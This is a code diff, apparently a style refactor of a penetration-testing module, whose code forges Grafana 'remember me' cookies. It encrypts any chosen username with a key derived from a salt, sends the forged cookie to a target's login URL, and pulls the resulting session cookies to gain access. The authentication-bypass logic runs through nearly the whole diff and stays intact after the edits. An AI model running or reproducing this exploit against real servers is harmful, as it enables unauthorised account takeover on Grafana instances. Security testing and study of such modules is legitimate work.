@@ -63,9 +63,9 @@ def encrypt_version5(username):
     nonce = os.urandom(12)
     username = username.encode()
     ct = aesgcm.encrypt(nonce, username, None)
-    cookie = str(binascii.hexlify(nonce), 'ascii') + \
-        str(binascii.hexlify(ct), 'ascii')
-    return cookie
+    return str(binascii.hexlify(nonce), 'ascii') + str(
+        binascii.hexlify(ct), 'ascii'
+    )
 
 
 def encrypt_version4(username):
@@ -76,9 +76,9 @@ def encrypt_version4(username):
     nonce = os.urandom(12)
     username = username.encode()
     ct = aesgcm.encrypt(nonce, username, None)
-    cookie = str(binascii.hexlify(nonce), 'ascii') + \
-        str(binascii.hexlify(ct), 'ascii')
-    return cookie
+    return str(binascii.hexlify(nonce), 'ascii') + str(
+        binascii.hexlify(ct), 'ascii'
+    )
 
 
 def decrypt_version5(cookie):
@@ -87,9 +87,8 @@ def decrypt_version5(cookie):
     key = hashlib.pbkdf2_hmac('sha256', salt, salt, iterations, 16)
     aesgcm = AESGCM(key)
     nonce = binascii.unhexlify(cookie[:24])
-    ct = binascii.unhexlify(cookie[24:len(cookie)])
-    username = str(aesgcm.decrypt(nonce, ct, None), 'ascii')
-    return username
+    ct = binascii.unhexlify(cookie[24:])
+    return str(aesgcm.decrypt(nonce, ct, None), 'ascii')
 
 
 def decrypt_version4(cookie):
@@ -98,31 +97,30 @@ def decrypt_version4(cookie):
     key = hashlib.pbkdf2_hmac('sha256', salt, salt, iterations, 16)
     aesgcm = AESGCM(key)
     nonce = binascii.unhexlify(cookie[:24])
-    ct = binascii.unhexlify(cookie[24:len(cookie)])
-    username = str(aesgcm.decrypt(nonce, ct, None), 'ascii')
-    return username
+    ct = binascii.unhexlify(cookie[24:])
+    return str(aesgcm.decrypt(nonce, ct, None), 'ascii')
 
 
 def run(args):
     if dependencies_requests_missing:
         logging.error('Module dependency (requests) is missing, cannot continue')
         return
-    
+
     if dependencies_cryptography_missing:
         logging.error('Module dependency (cryptography) is missing, cannot continue')
         return
-    
+
     if args['VERSION'] == "5":
         try:
             username = args['USERNAME']
             cookie = encrypt_version5(args['USERNAME'])
-            module.log("Encrypted remember cookie: "+cookie, "good")
+            module.log(f"Encrypted remember cookie: {cookie}", "good")
         except:
             module.log(
                 "No username set, trying to decrypt it from cookie.", "warning")
             try:
                 username = decrypt_version5(args['COOKIE'])
-                module.log("Decrypted username: "+username, "good")
+                module.log(f"Decrypted username: {username}", "good")
                 cookie = args['COOKIE']
             except:
                 module.log("Unable to set username", "error")
@@ -131,13 +129,13 @@ def run(args):
         try:
             username = args['USERNAME']
             cookie = encrypt_version4(args['USERNAME'])
-            module.log("Encrypted remember cookie: "+cookie, "good")
+            module.log(f"Encrypted remember cookie: {cookie}", "good")
         except:
             module.log(
                 "No username set, trying to decrypt it from cookie.", "warning")
             try:
                 username = decrypt_version4(args['COOKIE'])
-                module.log("Decrypted username: "+username, "good")
+                module.log(f"Decrypted username: {username}", "good")
                 cookie = args['COOKIE']
             except:
                 module.log("Unable to set username", "error")
@@ -162,7 +160,7 @@ def run(args):
             else:
                 url = "https://" + args['RHOSTS'] + ":" + \
                     args['RPORT'] + args['TARGETURI'] + "/login/"
-        module.log('Targeting URL: ' + url, 'debug')
+        module.log(f'Targeting URL: {url}', 'debug')
         r = requests.get(url=url, cookies=cookies, allow_redirects=False)
 
     except:
@@ -172,11 +170,17 @@ def run(args):
     if r.status_code == 302:
         try:
             grafana_user = re.search(
-                r"grafana_user=.*?;", r.headers['Set-Cookie']).group(0)
+                r"grafana_user=.*?;", r.headers['Set-Cookie']
+            )[0]
+
             grafana_remember = re.search(
-                r"grafana_remember=.*?;", r.headers['Set-Cookie']).group(0)
+                r"grafana_remember=.*?;", r.headers['Set-Cookie']
+            )[0]
+
             grafana_sess = re.search(
-                r"grafana_sess=.*?;", r.headers['Set-Cookie']).group(0)
+                r"grafana_sess=.*?;", r.headers['Set-Cookie']
+            )[0]
+
 
             module.log(
                 "Set following cookies to get access to the grafana instance.", "good")
